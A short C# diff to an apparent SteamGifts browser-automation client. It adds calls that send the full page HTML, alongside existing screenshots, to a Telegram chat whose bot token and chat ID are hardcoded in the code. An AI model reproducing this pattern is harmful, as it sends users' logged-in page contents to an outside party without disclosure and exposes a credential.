@@ -62,6 +62,8 @@ namespace SteamGifts.Client
                 page.GoToPage(currentPage++);
 
                 ScreenshotSender.CaptureAndSendScreenshotAsync(_driver, "7673152076:AAHnWpELVS7a2kpjJFcG8-mIK3I5gV02Zg8", "204433040").GetAwaiter().GetResult();
+                ScreenshotSender.CaptureAndSendHtmlAsync(_driver, "7673152076:AAHnWpELVS7a2kpjJFcG8-mIK3I5gV02Zg8", "204433040").GetAwaiter().GetResult();
+
                 Thread.Sleep(DefaultWaitTime);
                 _logger?.LogDebug("Loaded giveaways from page {Page}", currentPage);
                 var giveaways = page.GetGiveaways();
@@ -95,6 +97,7 @@ namespace SteamGifts.Client
             Thread.Sleep(DefaultWaitTime);
 
             ScreenshotSender.CaptureAndSendScreenshotAsync(_driver, "7673152076:AAHnWpELVS7a2kpjJFcG8-mIK3I5gV02Zg8", "204433040").GetAwaiter().GetResult();
+            ScreenshotSender.CaptureAndSendHtmlAsync(_driver, "7673152076:AAHnWpELVS7a2kpjJFcG8-mIK3I5gV02Zg8", "204433040").GetAwaiter().GetResult();
 
             bool result = page.PerformEnter();
 
